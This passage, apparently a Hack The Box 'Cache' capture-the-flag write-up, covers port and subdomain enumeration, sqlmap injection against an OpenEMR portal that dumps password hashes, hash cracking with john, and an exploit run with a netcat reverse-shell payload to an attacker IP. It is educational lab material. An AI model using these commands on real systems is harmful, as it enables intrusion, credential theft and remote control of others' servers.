...
<script src="https://asciinema.org/a/jSyVXhwfEiCHFD0Uu3exIlFpz.js" id="jSyVXhwfEiCHFD0Uu3exIlFpz" async></script>
...
```bash
a3nk17@kali:~$ sudo nmap -sC -sV 10.10.10.188
...
![](/assets/img/posts/cache/website1.png)

Login page:

![](/assets/img/posts/cache/website2.png)
...
![](/assets/img/posts/cache/website3.png)
...
![](/assets/img/posts/cache/website4.png)
...
```bash
a3nk17@kali:~$ ffuf -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -fw 902 -H "Host: FUZZ.htb" -u http://cache.htb
...
![](/assets/img/posts/cache/hms1.png)

Let's `dirbust` the site to see if we can find anything interesting.

```bash
a3nk17@kali:~$ gobuster dir -w tools/SecLists/Discovery/Web-Content/big.txt -u http://hms.htb
===============================================================
Gobuster v3.0.1
...
![](/assets/img/posts/cache/hms2.png)
...
![](/assets/img/posts/cache/version.png)
...
![](/assets/img/posts/cache/bypass1.png)

I'll `grab` the `cookie values` so I can use them with `sqlmap`.

![](/assets/img/posts/cache/bypass2.png)
...
```bash
a3nk17@kali:~/htb/cache$ sqlmap -u "http://hms.htb/portal/find_appt_popup_user.php?catid=*" --cookie="OpenEMR=vp4f9asgbv507vpt84cioecmbg; PHPSESSID=cs1o3vot21n4odtira0s19iqu1" --technique E --dbms=mysql        ___
       __H__
...
```
a3nk17@kali:~/htb/cache$ sqlmap -u "http://hms.htb/portal/find_appt_popup_user.php?catid=*" --cookie="OpenEMR=vp4f9asgbv507vpt84cioecmbg; PHPSESSID=cs1o3vot21n4odtira0s19iqu1" --technique E --dbms=mysql -D openemr -T users_secure --dump
        ___
       __H__                                                                                                       
 ___ ___[)]_____ ___ ___  {1.4.4#stable}                                                                           
|_ -| . [']     | .'| . |                                                                                          
...
```bash
a3nk17@kali:~/htb/cache$ john -w=/usr/share/wordlists/rockyou.txt hash.txt
...
```baash
a3nk17@kali:~/htb/cache$ python exploit.py http://hms.htb/ -u openemr_admin -p xxxxxx -c 'rm /tmp/s;mkfifo /tmp/s;cat /tmp/s|/bin/sh -i 2>&1|nc 10.10.14.10 4444 >/tmp/s'
 .---.  ,---.  ,---.  .-. .-.,---.          ,---.    
/ .-. ) | .-.\ | .-'  |  \| || .-'  |\    /|| .-.\   
| | |(_)| |-' )| `-.  |   | || `-.  |(\  / || `-'/   
| | | | | |--' | .-'  | |\  || .-'  (_)\/  ||   (    
...
```bash
a3nk17@kali:~/htb/cache$ rlwrap nc -lvnp 4444
...
```
a3nk17@kali:~/htb/cache$ ssh luffy@10.10.10.188
...
61673a57f540ad2350f46e78e6c4b8a1
```
![](/assets/img/posts/cache/pwn.png)
